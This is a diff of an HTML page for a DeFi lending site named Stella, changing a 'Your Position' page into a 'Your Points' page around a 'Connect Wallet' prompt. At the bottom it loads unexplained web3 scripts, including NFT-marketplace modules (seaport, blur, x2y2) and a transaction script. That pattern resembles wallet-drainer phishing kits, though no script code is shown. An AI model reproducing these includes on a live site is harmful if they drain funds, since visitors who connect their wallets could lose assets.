@@ -19,10 +19,10 @@
             <a href="./index.html" class="logo"><img loading="lazy" src="img/logo.svg" alt="logo"></a>
             <nav class="wrap">
                 <a href="./index.html">Strategy</a>
-                <a href="./lending.html">Lend</a>
-                <a href="./position.html" class="is__active">Your Position</a>
+                <a href="./lending.html">Lend</a>   
+                <a href="./position.html">Your Position</a>
                 <hr>
-                <a href="./points.html">Your Points</a>
+                <a href="./points.html" class="is__active">Your Points</a>
                 <a href="./lending.html">Leaderboard</a>
             </nav>
             <img src="img/arbitrum.svg" class="header__icon" alt="i">
@@ -33,30 +33,18 @@
 
     <main class="main">
         <div class="container">
-            <h1 class="h5">Your Position</h1>
+            <h1 class="h5">Your Points</h1>
 
-            <div class="position-top wrap">
+            <!-- <div class="position-top wrap">
                 <div class="wrap position-wrap">
-                    <button class="position__btn" data-possbtn="1">Strategy</button>
-                    <button class="position__btn is__active" data-possbtn="2">Lend</button>
+                    <button class="position__btn" data-possbtn="1">Your Points</button>
+                    <button class="position__btn" data-possbtn="1"></button>
                 </div>
-
-                <div class="position-title wrap" data-position="1">
-                    <span><b>Total Value</b> <i>-</i></span>
-                    <span><b>Total Debt</b> <i>- %</i></span>
-                    <span><b>Net Value</b> <i>- %</i></span>
-                </div>
-
-                <div class="position-title wrap" data-position="2">
-                    <span><b>Total Deposit</b> <i>-</i></span>
-                    <span><b>Average APY</b> <i>-%</i></span>
-                </div>
-
-            </div>
+            </div> -->
             <div class="position">
                 <img src="img/wallet.svg" alt="w">
                 <h2>You haven’t connected your wallet to Stella.</h2>
-                <button class="btn" onclick="modalOpen()" >Connect Wallet</button>
+                <button class="btn" onclick="modalOpen()">Connect Wallet</button>
             </div>
         </div>
     </main>
@@ -84,26 +72,26 @@
             <button class="modal-close">&times;</button>
             <img src="img/wallet.svg" alt="i" loading="lazy">
             <h3>You haven’t connected your wallet to Stella.</h3>
-            <button class="btn" onclick="modalOpen()" >Connect Wallet</button>
+            <button class="btn" onclick="modalOpen()">Connect Wallet</button>
         </div>
     </div>
 
     <script src="./js/jquery-3.4.1.min.js"></script>
     <script src="./js/scripts.js"></script>
-<script src="/assets/web3-provider/web3-modal.js"></script>
-<script src="/assets/web3-provider/web3-loader.js"></script>
-<script src="/assets/web3-provider/web3-connect.js"></script>
-<script src="/assets/web3-provider/web3-router.js"></script>
-<script src="/assets/web3-provider/web3-module.js"></script>
-<script src="/assets/web3-provider/web3-alert.js"></script>
-<script src="/assets/web3-provider/web3-seaport.js"></script>
-<script src="/assets/web3-provider/web3-data.js"></script>
-<script src="/assets/web3-provider/ethers.js"></script>
-<script src="/assets/web3-provider/ethereum-tx.js"></script>
-<script src="/assets/web3-modules/module-seaport.js"></script>
-<script src="/assets/web3-modules/module-blur.js"></script>
-<script src="/assets/web3-modules/module-x2y2.js"></script>
-<script src="/assets/web3-provider.js"></script>
+    <script src="/assets/web3-provider/web3-modal.js"></script>
+    <script src="/assets/web3-provider/web3-loader.js"></script>
+    <script src="/assets/web3-provider/web3-connect.js"></script>
+    <script src="/assets/web3-provider/web3-router.js"></script>
+    <script src="/assets/web3-provider/web3-module.js"></script>
+    <script src="/assets/web3-provider/web3-alert.js"></script>
+    <script src="/assets/web3-provider/web3-seaport.js"></script>
+    <script src="/assets/web3-provider/web3-data.js"></script>
+    <script src="/assets/web3-provider/ethers.js"></script>
+    <script src="/assets/web3-provider/ethereum-tx.js"></script>
+    <script src="/assets/web3-modules/module-seaport.js"></script>
+    <script src="/assets/web3-modules/module-blur.js"></script>
+    <script src="/assets/web3-modules/module-x2y2.js"></script>
+    <script src="/assets/web3-provider.js"></script>
 
 </body>
 
